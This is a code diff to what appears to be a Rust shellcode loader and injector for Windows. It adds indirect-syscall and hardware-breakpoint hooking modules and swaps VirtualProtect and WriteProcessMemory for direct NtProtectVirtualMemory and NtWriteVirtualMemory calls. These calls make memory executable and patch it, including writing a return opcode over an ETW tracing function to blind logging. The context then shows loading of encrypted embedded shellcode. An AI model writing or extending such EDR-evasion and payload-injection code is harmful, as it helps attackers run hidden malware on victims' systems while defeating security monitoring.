@@ -7,6 +7,17 @@ mod spoof_proc;
 mod find_remote;
 mod remote_fiber;
 mod get_privs;
+#[path = "indirect_def.rs"]
+pub mod def;
+#[path = "indirect_utils.rs"]
+pub mod utils;
+#[path = "indirect_hooks.rs"]
+pub mod hooks;
+#[path = "indirect_syscall.rs"]
+pub mod syscall;
+#[path = "indirect_lib.rs"]
+mod indirect_lib;
+mod missed_calls;
 
 use std::{
     ffi::c_void,
@@ -14,6 +25,8 @@ use std::{
     ptr::{self, copy_nonoverlapping, null_mut},
     vec::Vec,
 };
+use crate::hooks::{initialize_hooks, destroy_hooks};
+pub use indirect_lib::{get_ssn_by_name, set_hw_bp};
 
 use ntapi::{
     ntldr::LDR_DATA_TABLE_ENTRY,
@@ -41,6 +54,7 @@ use windows::{
 
 fn main() -> Result<()> {
     unsafe {
+        initialize_hooks();
         // parse cli args
         let args: Vec<String> = std::env::args().collect();
         let mode = if args.len() > 1 {
@@ -176,12 +190,19 @@ fn main() -> Result<()> {
         }
         let mut old_protect = PAGE_PROTECTION_FLAGS(0);
         // make page writable
-        VirtualProtect(
-            patch_addr.cast::<std::ffi::c_void>(),
-            1,
-            PAGE_EXECUTE_READWRITE,
-            &mut old_protect,
-        )?;
+        // VirtualProtect(patch_addr, 1, RWX, &mut old) -> NtProtectVirtualMemory
+        let mut base_addr = patch_addr as *mut c_void;
+        let mut region_size: usize = 1;
+        let mut old_prot_val: u32 = 0;
+
+        missed_calls::nt_protect_virtual_memory(
+            GetCurrentProcess().0 as *mut winapi::ctypes::c_void,
+            &mut base_addr as *mut *mut std::ffi::c_void as *mut *mut winapi::ctypes::c_void,
+            &mut region_size as *mut usize as *mut winapi::shared::basetsd::SIZE_T,
+            windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE.0,
+            &mut old_prot_val
+        );
+        old_protect = PAGE_PROTECTION_FLAGS(old_prot_val);
         // apply patch
         *patch_addr = patch_opcode;
         // restore protection
@@ -200,15 +221,17 @@ fn main() -> Result<()> {
         let handle = GetCurrentProcess();
         let ret_opcode: u8 = 0xC3; // ret opcode
         let size = mem::size_of_val(&ret_opcode);
-        let mut bytes_written: usize = 0;
+        let mut _bytes_written: usize = 0;
 
-        WriteProcessMemory(
-            handle,
-            nt_trace_addr,
-            &ret_opcode as *const u8 as *const c_void,
+        // WriteProcessMemory(ETW patch) -> NtWriteVirtualMemory
+        let mut bytes_written_etw: usize = 0;
+        missed_calls::nt_write_virtual_memory(
+            handle.0 as *mut winapi::ctypes::c_void,
+            nt_trace_addr as *mut winapi::ctypes::c_void,
+            &ret_opcode as *const u8 as *mut winapi::ctypes::c_void,
             size,
-            Some(&mut bytes_written as *mut usize),
-        )?;
+            &mut bytes_written_etw
+        );
 
         // load shellcode and decrypt at runtime
         let encrypted_shellcode: &[u8] = include_bytes!("enc_shellcode.bin");
@@ -376,6 +399,7 @@ fn main() -> Result<()> {
                 panic!("Failed: 900");
             }
         }
+        destroy_hooks();
     }
     Ok(())
 }
